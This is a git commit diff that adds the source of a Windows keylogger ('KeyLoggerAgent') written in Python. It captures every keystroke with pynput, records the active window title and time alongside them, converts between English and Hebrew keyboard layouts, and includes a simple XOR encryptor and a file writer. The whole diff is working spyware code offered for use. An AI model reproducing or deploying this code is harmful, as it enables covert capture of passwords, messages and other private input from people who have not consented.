663bfeb954febdae91f7c7e83ac15bfe1040a49a
moishy shuvax <moishy.shuvax@gmail.com>
2025-02-15 20:16:47 +0200

    Organizing in a folder, and splitting into files

---
+++ KeyLoggerAgent/ToolBox.py
@@ -0,0 +1,83 @@
+import time,ctypes,locale
+
+foreign_keys = []
+
+
+
+
+# returns the keyboard language of the current thread
+def get_keyboard_language():
+    try:
+        user32 = ctypes.WinDLL('user32', use_last_error=True)
+        hwnd = user32.GetForegroundWindow()
+        if hwnd == 0:
+            thread_id = ctypes.windll.kernel32.GetCurrentThreadId()
+        else:
+            thread_id = user32.GetWindowThreadProcessId(hwnd, None)
+        if not thread_id:
+            return "en-US"
+        hkl = user32.GetKeyboardLayout(thread_id)
+        if not hkl:
+            return "en-US"
+        language_id = hkl & 0xFFFF
+        language = locale.windows_locale.get(language_id, "en-US")
+        return language
+    except Exception:
+        return "en-US"
+
+# returns the language of the key
+def get_key_language(one_key):
+    try:
+        if '\u0590' <= one_key <= '\u05FF':
+            return "he_IL"
+        else:
+            return "en_US"
+    except Exception as e:
+        return f"Error: {e}"
+
+# replace the key language with the second language, only between English and Hebrew
+def format_language(one_key,old_l,new_l):
+    en_keyboard = ("q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l",";","'","z","x","c","v","b","n","m",",",".","/")
+    he_keyboard = ("/","'","ק","ר","א","ט","ו","ן","ם","פ","ש","ד","ג","כ","ע","י","ח","ל","ך","ף",",","ז","ס","ב","ה","נ","מ","צ","ת","ץ",".")
+    try:
+        if old_l == 'en_US':
+            index = en_keyboard.index(one_key)
+        elif old_l == 'he_IL':
+            index = he_keyboard.index(one_key)
+        else:
+            index = 0
+    except ValueError:
+        index = 0
+    if new_l == 'en_US':
+        return en_keyboard[index]
+    if new_l == 'he_IL':
+        return he_keyboard[index]
+
+
+
+# return formated key with current language
+def format_key(key):
+    print(key)
+    global foreign_keys
+    number_keyboard = ("<96>","<97>","<98>","<99>","<100>","<101>","<102>","<103>","<104>","<105>")
+    foreign_keyboard = {
+        "<110>":'.',
+        "Key.space":' ',
+        "Key.enter":'\n'
+    }
+
+    key1 = str(key).replace("'", "")
+    if key1 in number_keyboard:
+        return str(number_keyboard.index(key1))
+    elif key1 in foreign_keyboard:
+        return foreign_keyboard[key1]
+    elif key1.startswith('Key') or key1.startswith('\\x'):
+        foreign_keys.append(key1)
+        return ''
+    else:
+        key_l = get_key_language(key1)
+        keyboard_l = get_keyboard_language()
+        if key_l == keyboard_l:
+            return key1
+        else:
+            return format_language(key1,key_l,keyboard_l)
---
+++ KeyLoggerAgent/classes.py
@@ -0,0 +1,122 @@
+from abc import ABC, abstractmethod
+from pynput.keyboard import Listener
+from typing import List
+import time,json,random,string,ToolBox,threading,pywinctl
+
+
+class IKeyLogger(ABC):
+    @abstractmethod
+    def on_press(self,key) -> None:
+        pass
+    @abstractmethod
+    def get_logged_keys(self) -> dict[str:str]:
+        pass
+class IKeyLoggerManager(ABC):
+    @abstractmethod
+    def start_logging(self) -> None:
+        pass
+    @abstractmethod
+    def stop_logging(self) -> None:
+        pass
+    @abstractmethod
+    def get_logged_keys(self) -> dict[str:str]:
+        pass
+
+class Write(ABC):
+    @abstractmethod
+    def write(self, data:str) -> bool:
+        pass
+
+
+class KeyLoggerService(IKeyLogger):
+    def __init__(self):
+        self.__logged_keys = {}
+        self.__last_record = ""
+        self.__last_type_time = None
+        self.__last_window = None
+
+    def on_press(self, key) -> None:
+        key = ToolBox.format_key(key)
+        current_time = time.time()
+        current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))
+        active_window = pywinctl.getActiveWindow()
+
+        if self.__last_type_time is None or current_time - self.__last_type_time >= 15 or active_window != self.__last_window:
+            self.__last_record = active_window.title + ': ' + current_time_formatted
+
+        self.__last_type_time = current_time
+        self.__last_window = active_window
+        if self.__last_record not in self.__logged_keys:
+            self.__logged_keys[self.__last_record] = ""
+        self.__logged_keys[self.__last_record] += key
+
+    def get_logged_keys(self) -> dict[str:str]:
+        return self.__logged_keys
+
+    def clear_logged_keys(self) -> dict[str:str]:
+        self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}
+
+
+
+class FileWriter(Write):
+    def __init__(self,path=None):
+        self.path = path or r""
+
+    def write(self, data:dict[str:str]) -> bool:
+        try:
+            with open(self.path,"a") as file:
+                convert_data = json.dumps(data)
+                file.write(convert_data)
+                return True
+        except IOError:
+            return False
+
+
+class Encryptor:
+    def __init__(self):
+        self.key = "".join(random.choices(string.ascii_letters + string.digits,k=512))
+
+    def encrypt(self,data:str) -> str:
+        ciphertext = ""
+        length_key = len(self.key)
+        for i in range(len(data)):
+            ciphertext += chr(ord(data[i]) ^ ord(self.key[i % length_key]))
+        return ciphertext
+
+class KeyLoggerManager:
+    def __init__(self):
+        self.__key_logger = KeyLoggerService()
+        self.__writer = FileWriter()
+        self.__encryptor = Encryptor()
+        self.__is_logging = False
+        self.__logger_thread = threading.Thread(target=self.__listen)
+
+
+    def start_logging(self):
+        self.__is_logging = True
+        self.__logger_thread.start()
+
+    def stop_logging(self):
+        self.__is_logging = False
+
+    def __listen(self):
+        with Listener(on_press=self.__key_logger.on_press) as listener:
+            listener.join()
+
+    def print_keys(self):
+        logged_keys = self.__key_logger.get_logged_keys()
+        self.__key_logger.clear_logged_keys()
+        for key, value in logged_keys.items():
+            print(key)
+            print(value)
+
+x = KeyLoggerManager()
+x.start_logging()
+while True:
+    time.sleep(8)
+    x.print_keys()
+
+
+
+
+
